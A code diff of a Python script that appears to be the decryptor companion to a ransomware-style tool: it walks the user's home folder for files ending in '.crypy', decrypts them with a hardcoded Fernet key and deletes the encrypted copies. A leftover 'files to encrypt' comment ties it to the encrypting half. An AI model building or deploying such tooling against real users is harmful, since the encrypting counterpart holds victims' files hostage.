@@ -1,38 +1,45 @@
 #!/usr/bin/python3.8
 import getpass
-import glob
 import os
 import tkinter
 from tkinter import messagebox
 
 from cryptography.fernet import Fernet
 
+f_name = []
+targets = '.crypy'
 
-def decrypt():
-    # Decrypt the already encrypted files
-    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
+
+def find_file():
+    print('Looking for files to decrypt......')
     usr = getpass.getuser()
-    if True:
-        print("Getting files to decrypt. This may take a few minutes. Be patient.")
-        # Get files to decrypt
-        # Get documents in current user to decrypt
-        path = 'C:/Users/' + usr
-        for f_name in glob.glob(path + '/**/*.crypy', recursive=True):
-            k = key
-            f = Fernet(k)
-            print("Decrypting files")
-            try:
-                with open(f_name, "rb") as file:
-                    encrypted_data = file.read()
+    # Get files to encrypt from current user
+    path = 'C:/Users/' + usr + '/'
+    for r, d, files in os.walk(path):
+        for file in files:
+            if file.endswith(targets):
+                f_name.append(os.path.join(r, file))
+                print(f_name)
+                break
 
-                decrypted_data = f.decrypt(encrypted_data)
-                with open(f_name[:-6], "wb") as file:
-                    file.write(decrypted_data)
-                    os.remove(f_name)
-            except Exception as e:
-                print(e)
-                pass
-            print("Done. Thank you for waiting")
+
+def decrypt_file():
+    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
+    for fn in f_name:
+        k = key
+        f = Fernet(k)
+        try:
+            with open(fn, "rb") as file:
+                file_data = file.read()
+                decrypted_data = f.decrypt(file_data)
+            with open(fn[:-6], "wb") as file:
+                file.write(decrypted_data)
+                print(file)
+                os.remove(fn)
+                print('Done Decrypting Your Files.........')
+        except Exception as e:
+            print(e)
+            pass
 
 
 def message():
@@ -45,7 +52,8 @@ def message():
 
 
 def main():
-    decrypt()
+    find_file()
+    decrypt_file()
     message()
 
 
